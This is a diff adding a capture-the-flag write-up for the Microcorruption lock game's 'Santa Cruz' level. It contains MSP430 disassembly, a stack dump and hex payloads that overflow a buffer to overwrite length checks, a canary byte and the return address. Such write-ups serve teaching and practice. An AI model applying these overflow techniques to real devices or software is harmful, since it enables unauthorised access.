@@ -364,3 +364,130 @@ Level 8: Montevideo
 This level is exactly like the previous one (Whitehorse). In the overview it is mentioned that the developers changed the code to "conform to the internal secure development process". This statement is supported by the code, since now the user's password is overwritten using `memset` after it is checked.
 
 However, it still persists in the stack (where it to was copied to using `strcpy`) and therefore enables us to use the same trick from before. Entering `0x6161616161616161616161616161616160447f` will take us to the next level.
+
+Level 9: Santa Cruz
+-------------------
+
+In this level the HSM 1 is used instead of HSM 2. Thus, the code to unlock the deadbolt resides inside the LockIT Pro and we need to find a way to make the program reach it. A viable way is to smash the stack and overwrite the return address with that of `unlock_door`. However, this is a bit more complicated than previous levels. Below is the code of the infamous `login` subroutine broken into several parts and accompanied by my explanations.
+
+```
+4550 <login>
+4550:  0b12           push  r11
+4552:  0412           push  r4
+4554:  0441           mov   sp, r4
+4556:  2452           add   #0x4, r4
+4558:  3150 d8ff      add   #0xffd8, sp
+455c:  c443 faff      mov.b #0x0, -0x6(r4)
+4560:  f442 e7ff      mov.b #0x8, -0x19(r4)
+4564:  f440 1000 e8ff mov.b #0x10, -0x18(r4)
+456a:  3f40 8444      mov   #0x4484 "Authentication now requires a username and password.", r15
+456e:  b012 2847      call  #0x4728 <puts>
+4572:  3f40 b944      mov   #0x44b9 "Remember: both are between 8 and 16 characters.", r15
+4576:  b012 2847      call  #0x4728 <puts>
+457a:  3f40 e944      mov   #0x44e9 "Please enter your username:", r15
+457e:  b012 2847      call  #0x4728 <puts>
+4582:  3e40 6300      mov   #0x63, r14
+4586:  3f40 0424      mov   #0x2404, r15
+458a:  b012 1847      call  #0x4718 <getsn>
+458e:  3f40 0424      mov   #0x2404, r15
+4592:  b012 2847      call  #0x4728 <puts>
+4596:  3e40 0424      mov   #0x2404, r14
+459a:  0f44           mov   r4, r15
+459c:  3f50 d6ff      add   #0xffd6, r15
+45a0:  b012 5447      call  #0x4754 <strcpy>
+45a4:  3f40 0545      mov   #0x4505 "Please enter your password:", r15
+45a8:  b012 2847      call  #0x4728 <puts>
+45ac:  3e40 6300      mov   #0x63, r14
+45b0:  3f40 0424      mov   #0x2404, r15
+45b4:  b012 1847      call  #0x4718 <getsn>
+45b8:  3f40 0424      mov   #0x2404, r15
+45bc:  b012 2847      call  #0x4728 <puts>
+45c0:  0b44           mov   r4, r11
+45c2:  3b50 e9ff      add   #0xffe9, r11
+45c6:  3e40 0424      mov   #0x2404, r14
+45ca:  0f4b           mov   r11, r15
+45cc:  b012 5447      call  #0x4754 <strcpy>
+```
+
+At this stage, assuming we entered `doge` and `idosch1234` as username and password, the stack will look like this:
+```
+4390:   0000 d846 0300 4c47 0000 0a00 0000 d045   ...F..LG.......E
+43a0:   0000 646f 6765 0000 0000 0000 0000 0000   ..doge..........
+43b0:   0000 0008 1069 646f 7363 6831 3233 3400   .....idosch1234.
+43c0:   0000 0000 0000 0000 0000 0000 4044 0000   ............@D..
+```
+
+with `sp` pointing to `0x43a0`. It's important to take notice here of several parameters:
+
+1. Username and password starting at addresses `0x43a2` and `0x43b5`, respectively.
+2. Return address at `0x43cc`.
+3. Values `0x8` and `0x10` at `0x43b3` and `0x43b4`, respectively. These values will be later used in order to make sure that the password's length is indeed between 8 to 16 chars (inclusive).
+
+The password's length is computed and stored in `r11`.
+```
+45d0:  0f4b           mov   r11, r15
+45d2:  0e44           mov   r4, r14
+45d4:  3e50 e8ff      add   #0xffe8, r14
+45d8:  1e53           inc   r14
+45da:  ce93 0000      tst.b 0x0(r14)
+45de:  fc23           jnz   #0x45d8 <login+0x88>
+45e0:  0b4e           mov   r14, r11
+45e2:  0b8f           sub   r15, r11
+```
+The password's length is checked to be less than 16 chars using the value stored at `0x43b4`.
+```
+45e4:  5f44 e8ff      mov.b -0x18(r4), r15
+45e8:  8f11           sxt   r15
+45ea:  0b9f           cmp   r15, r11
+45ec:  0628           jnc   #0x45fa <login+0xaa>
+45ee:  1f42 0024      mov   &0x2400, r15
+45f2:  b012 2847      call  #0x4728 <puts>
+45f6:  3040 4044      br    #0x4440 <__stop_progExec__>
+```
+And now it's checked to be at least 8 chars long.
+
+```
+45fa:  5f44 e7ff      mov.b -0x19(r4), r15
+45fe:  8f11           sxt   r15
+4600:  0b9f           cmp   r15, r11
+4602:  062c           jc    #0x4610 <login+0xc0>
+4604:  1f42 0224      mov   &0x2402, r15
+4608:  b012 2847      call  #0x4728 <puts>
+460c:  3040 4044      br    #0x4440 <__stop_progExec__>
+```
+After passing both of these checks the password is now passed to the HSM 1 for validation (spoiler: it's not).
+```
+4610:  c443 d4ff      mov.b #0x0, -0x2c(r4)
+4614:  3f40 d4ff      mov   #0xffd4, r15
+4618:  0f54           add   r4, r15
+461a:  0f12           push  r15
+461c:  0f44           mov   r4, r15
+461e:  3f50 e9ff      add   #0xffe9, r15
+4622:  0f12           push  r15
+4624:  3f50 edff      add   #0xffed, r15
+4628:  0f12           push  r15
+462a:  3012 7d00      push  #0x7d
+462e:  b012 c446      call  #0x46c4 <INT>
+4632:  3152           add   #0x8, sp
+4634:  c493 d4ff      tst.b -0x2c(r4)
+4638:  0524           jz    #0x4644 <login+0xf4>
+463a:  b012 4a44      call  #0x444a <unlock_door>
+463e:  3f40 2145      mov   #0x4521 "Access granted.", r15
+4642:  023c           jmp   #0x4648 <login+0xf8>
+4644:  3f40 3145      mov   #0x4531 "That password is not correct.", r15
+4648:  b012 2847      call  #0x4728 <puts>
+```
+Although the password's length was already checked twice, another test is performed here: memory location `0x43c6` is checked to be `0x0` (very much like the "canary" in Johannesburg).
+
+```
+464c:  c493 faff      tst.b -0x6(r4)
+4650:  0624           jz    #0x465e <login+0x10e>
+4652:  1f42 0024      mov   &0x2400, r15
+4656:  b012 2847      call  #0x4728 <puts>
+465a:  3040 4044      br    #0x4440 <__stop_progExec__>
+465e:  3150 2800      add   #0x28, sp
+4662:  3441           pop   r4
+4664:  3b41           pop   r11
+4666:  3041           ret
+```
+After absorbing all these information it's pretty clear what to do. We begin by entering a username that will overwrite the password's length boundaries at `0x43a2` and `0x43b5` with more appropriate values such as `0x1` and `0xff`. We also use the username to change the return address at `0x43cc` to that of `unlock_door`. `0x616161616161616161616161616161616101ff61616161616161616161616161616161616161616161614a44` is a good choice. Next, we enter a password whose sole purpose is to overwrite `0x43c6` with `0x0`. Since the username already took care of the password's length we can enter a password longer than 16 chars. `0x616161616161616161616161616161616100` does the job.
